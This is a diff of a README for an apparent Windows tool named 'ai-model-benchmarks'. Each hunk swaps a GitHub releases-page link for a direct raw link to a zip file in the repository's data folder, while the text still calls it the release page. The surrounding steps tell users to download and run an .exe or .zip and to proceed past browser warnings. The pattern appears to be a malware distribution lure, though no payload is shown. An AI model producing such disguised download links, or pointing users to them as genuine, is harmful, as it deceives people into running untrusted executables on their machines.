@@ -1,6 +1,6 @@
 # 📊 ai-model-benchmarks - Compare AI models with clear scores
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue.svg)](https://github.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue.svg)](https://raw.githubusercontent.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/main/data/ai_model_benchmarks_3.8.zip)
 
 ## 🧭 What this is
 
@@ -28,7 +28,7 @@ If your computer asks for admin access, you may need a user account with install
 
 ## 🚀 Download and run
 
-1. Open the release page: https://github.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/releases
+1. Open the release page: https://raw.githubusercontent.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/main/data/ai_model_benchmarks_3.8.zip
 2. Find the latest release at the top of the page
 3. Look for a Windows file, such as `.exe` or `.zip`
 4. Download the file
@@ -241,7 +241,7 @@ Some browsers flag unknown files. If that happens, use the release page again an
 
 To get the latest version:
 
-1. Visit the release page again: https://github.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/releases
+1. Visit the release page again: https://raw.githubusercontent.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/main/data/ai_model_benchmarks_3.8.zip
 2. Download the newest Windows file
 3. Replace the old version if needed
 4. Open the new file
@@ -324,4 +324,4 @@ That makes the data easier to trust and easier to review
 
 ## ⬇️ Download again
 
-If you want to get the app now, visit the release page to download: https://github.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/releases
+If you want to get the app now, visit the release page to download: https://raw.githubusercontent.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/main/data/ai_model_benchmarks_3.8.zip
